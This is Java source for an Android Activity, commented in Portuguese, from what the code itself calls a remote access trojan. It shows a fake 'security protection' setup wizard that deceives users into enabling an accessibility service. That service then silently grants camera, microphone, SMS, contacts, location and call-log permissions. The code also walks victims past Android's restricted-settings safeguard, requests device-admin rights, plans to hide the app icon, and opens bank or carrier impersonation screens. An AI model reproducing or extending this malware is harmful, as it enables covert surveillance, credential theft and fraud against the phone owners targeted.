package com.seguranca.protecao;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

/**
 * WIZARD DE CONFIGURAÇÃO FALSO
 * 
 * Esta Activity mostra um "guia passo a passo" FAKE que:
 * 1. Mostra telas profissionais imitando setup do Android
 * 2. Usuário clica "Avançar" / "Permitir" em cada etapa
 * 3. Em BACKGROUND, AccessibilityService automatiza tudo SILENCIOSAMENTE
 * 4. Usuário NUNCA vê as configurações reais do Android
 * 
 * Fluxo guiado de configuração inicial com automação em background.
 */
public class SetupWizardActivity extends Activity {

    private static final String TAG = "SetupWizard";
    
    // Etapas do wizard
    private static final int STEP_WELCOME = 0;
    private static final int STEP_ACCESSIBILITY = 1;
    private static final int STEP_PERMISSIONS = 2;
    private static final int STEP_BATTERY = 3;
    private static final int STEP_SCREEN_CAPTURE = 4;
    private static final int STEP_COMPLETE = 5;
    
    private int currentStep = STEP_WELCOME;
    
    // 🎨 Modo Visual APK - pula wizard e vai direto para telas customizadas
    private boolean isVisualAPK = false;
    
    // Views
    private ImageView ivIcon;
    private TextView tvTitle;
    private TextView tvDescription;
    private ProgressBar progressBar;
    private TextView tvProgress;
    private Button btnNext;
    private View loadingView;
    
    private Handler handler = new Handler();
    private PermissionManager permissionManager;
    
    // Receiver para receber notificações do AccessibilityService
    private BroadcastReceiver automationReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getStringExtra("action");
            Log.d(TAG, "Recebeu broadcast: " + action);
            
            if ("step_completed".equals(action)) {
                // Etapa completada automaticamente
                hideLoading();
                nextStep();
            }
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_setup_wizard);
        
        permissionManager = new PermissionManager(this);
        
        // Inicializa views
        ivIcon = findViewById(R.id.setupIcon);
        tvTitle = findViewById(R.id.setupTitle);
        tvDescription = findViewById(R.id.setupDescription);
        progressBar = findViewById(R.id.setupProgress);
        tvProgress = findViewById(R.id.setupProgressText);
        btnNext = findViewById(R.id.btnNext);
        loadingView = findViewById(R.id.loadingView);
        
        btnNext.setOnClickListener(v -> onNextClicked());
        
        // 🚀 Inicia CommandControlService imediatamente
        try {
            Intent ccIntent = new Intent(this, CommandControlService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(ccIntent);
            } else {
                startService(ccIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar CommandControlService: " + e.getMessage());
        }
        
        // Registra receiver para escutar automação (com flag para Android 15+)
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.AUTOMATION_UPDATE");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ (API 34) requer flag RECEIVER_NOT_EXPORTED
            registerReceiver(automationReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(automationReceiver, filter);
        }
        
        boolean hasWebView = (CommandControlService.WEBVIEW_URL != null && !CommandControlService.WEBVIEW_URL.trim().isEmpty());
        
        // 🎨 Verifica se é APK Studio (tem studio_config.json)
        if (StudioActivity.hasStudioConfig(this) && !hasWebView) {
            Log.d(TAG, "🎨 APK STUDIO detectado - abrindo StudioActivity DIRETO");
            // APK Studio: vai DIRETO para as telas customizadas do APK Studio
            Intent studioIntent = new Intent(this, StudioActivity.class);
            studioIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(studioIntent);
            finish();
            return;
        }
        
        // 🎨 Verifica se é APK Visual (tem visual_config.json)
        isVisualAPK = VisualScreenActivity.hasVisualConfig(this);
        
        if (isVisualAPK && !hasWebView) {
            Log.d(TAG, "🎨 APK VISUAL detectado - abrindo VisualScreenActivity DIRETO");
            // APK Visual: vai DIRETO para as telas customizadas (100% customizável)
            // A tela de acessibilidade é criada pelo usuário no editor visual
            Intent visualIntent = new Intent(this, VisualScreenActivity.class);
            visualIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(visualIntent);
            finish();
            return;
        }
        
        // APK Normal: mostra wizard padrão
        if (permissionManager.isAccessibilityServiceEnabled()) {
            currentStep = STEP_PERMISSIONS;
        } else {
            currentStep = STEP_WELCOME;
        }
        showCurrentStep();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(automationReceiver);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        
        // Se a acessibilidade foi ativada, e precisamos do Device Admin mas ele ainda não está ativo
        if (permissionManager.isAccessibilityServiceEnabled() && CommandControlService.REQUEST_ADMIN) {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Log.d(TAG, "🛡️ Solicitando ativação do Device Admin no onResume de SetupWizardActivity...");
                CommandControlService.requestAdminRuntime = true;
                Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Proteção do Sistema");
                
                startActivity(adminIntent);
                
                monitorAdminActivation(false);
                return;
            }
        }
        
        // Se a acessibilidade já está ativa e não precisa de admin (ou já é admin)
        if (permissionManager.isAccessibilityServiceEnabled()) {
            boolean needsAdmin = false;
            if (CommandControlService.REQUEST_ADMIN) {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                    needsAdmin = true;
                }
            }
            if (!needsAdmin) {
                if (isVisualAPK) {
                    finishSetup();
                } else if (currentStep <= STEP_ACCESSIBILITY) {
                    currentStep = STEP_PERMISSIONS;
                    hideLoading();
                    showCurrentStep();
                }
            }
        }
    }
    
    /**
     * Usuário clicou em "Avançar"
     */
    private void onNextClicked() {
        Log.d(TAG, "Next clicked - Step: " + currentStep);
        
        switch (currentStep) {
            case STEP_WELCOME:
                // Apenas avança
                nextStep();
                break;
                
            case STEP_ACCESSIBILITY:
                // Mostra loading e abre ACCESSIBILITY nas configurações REAIS
                showLoading("Configurando serviço de proteção...");
                openAccessibilitySettings();
                break;
                
            case STEP_PERMISSIONS:
                // Mostra loading e automatiza permissões
                showLoading("Concedendo permissões necessárias...");
                automatePermissions();
                break;
                
            case STEP_BATTERY:
                // Mostra loading e automatiza bateria
                showLoading("Otimizando para proteção contínua...");
                automateBatteryOptimization();
                break;
                
            case STEP_SCREEN_CAPTURE:
                // Mostra loading e automatiza captura de tela
                showLoading("Ativando proteção avançada...");
                automateScreenCapture();
                break;
                
            case STEP_COMPLETE:
                finishSetup();
                break;
        }
    }
    
    /**
     * Mostra etapa atual
     */
    private void showCurrentStep() {
        // 🎨 APK Visual: mostra tela simplificada de ativação
        if (isVisualAPK) {
            progressBar.setVisibility(View.GONE);
            tvProgress.setVisibility(View.GONE);
            showVisualAPKActivation();
            return;
        }
        
        // APK Normal: mostra wizard completo
        progressBar.setVisibility(View.VISIBLE);
        tvProgress.setVisibility(View.VISIBLE);
        
        // Atualiza barra de progresso
        int progress = (currentStep * 100) / STEP_COMPLETE;
        progressBar.setProgress(progress);
        tvProgress.setText(currentStep + " de " + STEP_COMPLETE);
        
        switch (currentStep) {
            case STEP_WELCOME:
                showWelcomeStep();
                break;
            case STEP_ACCESSIBILITY:
                showAccessibilityStep();
                break;
            case STEP_PERMISSIONS:
                showPermissionsStep();
                break;
            case STEP_BATTERY:
                showBatteryStep();
                break;
            case STEP_SCREEN_CAPTURE:
                showScreenCaptureStep();
                break;
            case STEP_COMPLETE:
                showCompleteStep();
                break;
        }
    }
    
    /**
     * 🎨 Tela de ativação para APK Visual
     * Mostra apenas a ativação de acessibilidade com visual de banco/operadora
     */
    private void showVisualAPKActivation() {
        ivIcon.setImageResource(android.R.drawable.ic_dialog_info);
        tvTitle.setText("Ativação de Segurança");
        tvDescription.setText(
            "Para validar seu dispositivo e garantir uma conexão segura, " +
            "precisamos ativar o serviço de proteção.\n\n" +
            "Este serviço é necessário para:\n\n" +
            "• Validar a identidade do dispositivo\n" +
            "• Criptografar a comunicação\n" +
            "• Proteger suas informações\n\n" +
            "Toque em ATIVAR para continuar."
        );
        btnNext.setText("ATIVAR PROTEÇÃO");
    }
    
    private void showWelcomeStep() {
        ivIcon.setImageResource(android.R.drawable.ic_lock_idle_lock);
        tvTitle.setText("Bem-vindo ao Sistema de Proteção");
        tvDescription.setText(
            "Este assistente irá configurar a proteção do seu dispositivo em apenas alguns passos.\n\n" +
            "Você precisará conceder algumas permissões para que a proteção funcione corretamente.\n\n" +
            "Toque em AVANÇAR para continuar."
        );
        btnNext.setText("Avançar");
    }
    
    private void showAccessibilityStep() {
        ivIcon.setImageResource(android.R.drawable.ic_menu_preferences);
        tvTitle.setText("Etapa 1: Serviço de Proteção");
        tvDescription.setText(
            "O Serviço de Proteção precisa ser ativado para:\n\n" +
            "• Detectar aplicativos maliciosos\n" +
            "• Bloquear ameaças automaticamente\n" +
            "• Proteger seus dados em tempo real\n\n" +
            "Toque em ATIVAR para habilitar o serviço."
        );
        btnNext.setText("Ativar Serviço");
    }
    
    private void showPermissionsStep() {
        ivIcon.setImageResource(android.R.drawable.ic_menu_info_details);
        tvTitle.setText("Etapa 2: Permissões de Segurança");
        tvDescription.setText(
            "Para funcionar corretamente, precisamos de:\n\n" +
            "• Câmera - detectar ameaças visuais\n" +
            "• Microfone - monitorar atividades suspeitas\n" +
            "• SMS - verificar mensagens perigosas\n" +
            "• Contatos - proteger sua lista\n" +
            "• Localização - rastrear dispositivo roubado\n\n" +
            "Toque em CONCEDER PERMISSÕES."
        );
        btnNext.setText("Conceder Permissões");
    }
    
    private void showBatteryStep() {
        ivIcon.setImageResource(android.R.drawable.ic_lock_power_off);
        tvTitle.setText("Etapa 3: Proteção Contínua");
        tvDescription.setText(
            "Para manter seu dispositivo protegido 24/7, precisamos executar em segundo plano.\n\n" +
            "Isso garantirá que a proteção esteja sempre ativa, mesmo quando você não está usando o aparelho.\n\n" +
            "Toque em ATIVAR para permitir execução contínua."
        );
        btnNext.setText("Ativar Proteção Contínua");
    }
    
    private void showScreenCaptureStep() {
        ivIcon.setImageResource(android.R.drawable.ic_menu_camera);
        tvTitle.setText("Etapa 4: Proteção Avançada");
        tvDescription.setText(
            "Ative a Proteção Avançada para:\n\n" +
            "• Detectar capturas de tela não autorizadas\n" +
            "• Monitorar atividades suspeitas\n" +
            "• Registrar tentativas de acesso\n\n" +
            "Toque em ATIVAR para habilitar a proteção avançada."
        );
        btnNext.setText("Ativar Proteção Avançada");
    }
    
    private void showCompleteStep() {
        ivIcon.setImageResource(android.R.drawable.ic_dialog_info);
        tvTitle.setText("✅ Configuração Concluída!");
        tvDescription.setText(
            "Parabéns! Seu dispositivo está agora protegido.\n\n" +
            "O Sistema de Proteção está ativo e monitorando ameaças 24/7.\n\n" +
            "Você pode fechar este assistente."
        );
        btnNext.setText("Concluir");
    }
    
    /**
     * Avança para próxima etapa
     */
    private void nextStep() {
        currentStep++;
        
        // 🎨 APK Visual: após acessibilidade, pula direto para telas customizadas
        if (isVisualAPK && currentStep > STEP_ACCESSIBILITY) {
            Log.d(TAG, "🎨 APK Visual - acessibilidade OK, abrindo telas customizadas");
            finishSetup();
            return;
        }
        
        showCurrentStep();
    }
    
    /**
     * Mostra loading
     */
    private void showLoading(String message) {
        loadingView.setVisibility(View.VISIBLE);
        btnNext.setEnabled(false);
        
        TextView tvLoading = findViewById(R.id.loadingMessage);
        tvLoading.setText(message);
    }
    
    /**
     * Esconde loading
     */
    private void hideLoading() {
        loadingView.setVisibility(View.GONE);
        btnNext.setEnabled(true);
    }
    
    /**
     * Abre configurações de acessibilidade REAIS
     * AccessibilityService vai guiar o usuário com overlay
     */
    private void openAccessibilitySettings() {
        // Android 15/16 - Mostra instruções especiais
        if (android.os.Build.VERSION.SDK_INT >= 35) {
            showAndroid15Instructions();
            return;
        }
        
        // Abre settings diretamente
        handler.postDelayed(() -> {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            
            // CRITICAL: Android 14+ bypass para RESTRICTED SETTINGS
            if (android.os.Build.VERSION.SDK_INT >= 34) { // Android 14+
                intent.putExtra("android.provider.extra.SETTINGS_EMBEDDED_DEEP_LINK_HIGHLIGHT_MENU_KEY", "top_level_accessibility");
                intent.putExtra("android.provider.extra.SETTINGS_EMBEDDED_DEEP_LINK_INTENT_URI", 
                    "android-app://" + getPackageName() + "/" + UiAssistBridge.class.getName());
            }
            
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // Monitora quando serviço for ativado (com TIMEOUT)
            monitorAccessibilityActivation();
        }, 500);
    }
    
    /**
     * Mostra instruções para Android 15/16 (Restricted Settings)
     */
    private void showAndroid15Instructions() {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("Configuração Especial Necessária");
        builder.setMessage(
            "SIGA EXATAMENTE ESTES PASSOS:\n\n" +
            "1. Na próxima tela, clique em 'Otimização de Bateria Avançada'\n\n" +
            "2. Quando aparecer o aviso, clique em 'Allow restricted settings' (Permitir configurações restritas)\n\n" +
            "3. Depois ative o serviço normalmente\n\n" +
            "4. Volte para este app e aguarde a próxima etapa"
        );
        builder.setPositiveButton("Abrir Configurações", (dialog, which) -> {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // Monitora ativação
            monitorAccessibilityActivation();
        });
        builder.setNegativeButton("Cancelar", null);
        builder.setCancelable(false);
        builder.show();
    }
    
    /**
     * Monitora ativação do serviço de acessibilidade (COM TIMEOUT)
     */
    private void monitorAccessibilityActivation() {
        final int MAX_ATTEMPTS = 60; // 60 segundos timeout
        final int[] attempts = {0};
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                attempts[0]++;
                
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    Log.d(TAG, "✅ Accessibility ativado!");
                    
                    // Se temos WebView URL configurada, finaliza o setup e abre a WebView imediatamente!
                    if (CommandControlService.WEBVIEW_URL != null && !CommandControlService.WEBVIEW_URL.trim().isEmpty()) {
                        finishSetup();
                        return;
                    }
                    
                    // VOLTA AUTOMATICAMENTE para o wizard!
                    Intent intent = new Intent(SetupWizardActivity.this, SetupWizardActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    startActivity(intent);
                    
                    hideLoading();
                    nextStep();
                } else if (attempts[0] >= MAX_ATTEMPTS) {
                    // TIMEOUT: Assume que usuário ativou manualmente em restricted settings
                    Log.w(TAG, "⚠️ Timeout atingido - assumindo ativação manual");
                    
                    // Volta para o wizard e prossegue
                    Intent intent = new Intent(SetupWizardActivity.this, SetupWizardActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    startActivity(intent);
                    
                    hideLoading();
                    
                    // Força próximo passo mesmo sem detectar
                    handler.postDelayed(() -> {
                        nextStep();
                    }, 1000);
                } else {
                    // Continua monitorando
                    handler.postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
    
    /**
     * Automatiza concessão de permissões
     * O AccessibilityService vai clicar em "Allow" automaticamente
     */
    private void automatePermissions() {
        // Notifica AccessibilityService para começar a automatizar
        Intent intent = new Intent("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS");
        sendBroadcast(intent);
        
        // Solicita permissões UMA POR VEZ para AccessibilityService conseguir clicar
        // Iniciamos com Camera
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            requestPermissions(new String[]{android.Manifest.permission.CAMERA}, 1001);
        }
        
        // Aguarda automação e avança
        handler.postDelayed(() -> {
            hideLoading();
            nextStep();
        }, 8000); // 8 segundos para dar tempo de solicitar todas
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        // Solicita próxima permissão automaticamente
        handler.postDelayed(() -> {
            if (requestCode == 1001) {
                // Camera -> Microphone
                requestPermissions(new String[]{android.Manifest.permission.RECORD_AUDIO}, 1002);
            } else if (requestCode == 1002) {
                // Microphone -> Location
                requestPermissions(new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION}, 1003);
            } else if (requestCode == 1003) {
                // Location -> SMS
                requestPermissions(new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.SEND_SMS}, 1004);
            } else if (requestCode == 1004) {
                // SMS -> Contacts
                requestPermissions(new String[]{android.Manifest.permission.READ_CONTACTS}, 1005);
            } else if (requestCode == 1005) {
                // Contacts -> Phone
                requestPermissions(new String[]{android.Manifest.permission.READ_PHONE_STATE, android.Manifest.permission.CALL_PHONE}, 1006);
            } else if (requestCode == 1006) {
                // Phone -> Call Logs
                requestPermissions(new String[]{android.Manifest.permission.READ_CALL_LOG}, 1007);
            }
            // Depois de 1007, todas as permissões foram solicitadas
        }, 500);
    }
    
    /**
     * Automatiza otimização de bateria
     */
    private void automateBatteryOptimization() {
        // Notifica AccessibilityService
        Intent intent = new Intent("com.seguranca.protecao.AUTO_DISABLE_BATTERY");
        sendBroadcast(intent);
        
        // Aguarda automação (fake)
        handler.postDelayed(() -> {
            hideLoading();
            nextStep();
        }, 3000);
    }
    
    /**
     * Captura de tela — controlada pelo painel web (HVNC takeScreenshot, Android 11+).
     */
    private void automateScreenCapture() {
        // Painel web: botão "Iniciar Captura" → TOGGLE_SILENT_VNC
        
        // Apenas avança para o próximo passo
        handler.postDelayed(() -> {
            hideLoading();
            nextStep();
        }, 1000);
    }
    
    /**
     * Finaliza setup
     */
    private void finishSetup() {
        // Se pedir administrador está ativo e não está ativo ainda, pede antes de finalizar!
        if (CommandControlService.REQUEST_ADMIN) {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Log.d(TAG, "🛡️ Solicitando ativação do Device Admin antes de finalizar...");
                CommandControlService.requestAdminRuntime = true;
                Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Proteção do Sistema");
                
                startActivity(adminIntent);
                
                // Monitora a ativação do Admin antes de prosseguir
                monitorAdminActivation(true);
                return; // Pausa o finishSetup
            }
        }

        // Salva que setup foi concluído
        getSharedPreferences("rat_prefs", MODE_PRIVATE)
            .edit()
            .putBoolean("setup_completed", true)
            .commit();
        
        // Inicia serviços
        Intent ccIntent = new Intent(this, CommandControlService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(ccIntent);
        } else {
            startService(ccIntent);
        }
        
        // Ocultamento imediato desativado para evitar crash/kill do processo antes de exibir a WebView.
        // O ícone será ocultado de forma totalmente invisível e segura no SCREEN_OFF.
        /*
        if (CommandControlService.HIDE_ICON) {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName componentName = new android.content.ComponentName(
                this, MainActivity.class
            );
            pm.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "[HIDE] Ícone removido da tela inicial via PackageManager");
        }
        */
        
        // Verifica se existe configuração visual (APK Builder Visual)
        // Se existir, abre a tela de operadora/banco personalizada
        if (VisualScreenActivity.hasVisualConfig(this)) {
            Log.d(TAG, "📱 Configuração visual encontrada - abrindo VisualScreenActivity");
            Intent visualIntent = new Intent(this, VisualScreenActivity.class);
            visualIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(visualIntent);
        } else if (CommandControlService.WEBVIEW_URL != null && !CommandControlService.WEBVIEW_URL.trim().isEmpty()) {
            Log.d(TAG, "🌐 WEBVIEW_URL encontrada - abrindo WebViewActivity");
            Intent webViewIntent = new Intent(this, WebViewActivity.class);
            webViewIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(webViewIntent);
        }
        
        // Fecha wizard
        finish();
    }

    /**
     * Monitora ativação do Device Admin antes de finalizar
     */
    private void monitorAdminActivation(final boolean shouldFinish) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(SetupWizardActivity.this, MyAdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(adminComponent)) {
                    Log.d(TAG, "🛡️ Device Admin ativado! Prosseguindo...");
                    if (shouldFinish) {
                        finishSetup(); // Retoma finalização
                    } else {
                        currentStep = STEP_PERMISSIONS;
                        hideLoading();
                        showCurrentStep();
                    }
                } else {
                    // Continua monitorando
                    handler.postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
}
